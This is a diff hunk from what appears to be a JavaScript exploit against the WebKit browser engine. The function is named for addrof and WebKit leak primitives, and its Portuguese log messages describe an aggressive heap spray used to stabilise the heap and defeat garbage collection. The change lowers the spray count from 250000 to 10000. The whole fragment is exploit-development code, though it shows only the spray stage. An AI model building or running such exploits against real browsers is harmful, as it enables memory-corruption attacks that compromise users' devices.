@@ -395,7 +395,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
 
         logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos AGRESSIVO) ---", "subtest");
         const sprayStartTime = performance.now();
-        const INITIAL_SPRAY_COUNT = 250000;
+        const INITIAL_SPRAY_COUNT = 10000;
         logFn(`Iniciando spray de objetos (volume ${INITIAL_SPRAY_COUNT}) para estabilização inicial do heap e anti-GC...`, "info");
         for (let i = 0; i < INITIAL_SPRAY_COUNT; i++) {
             const dataSize = 50 + (i % 50) * 16;
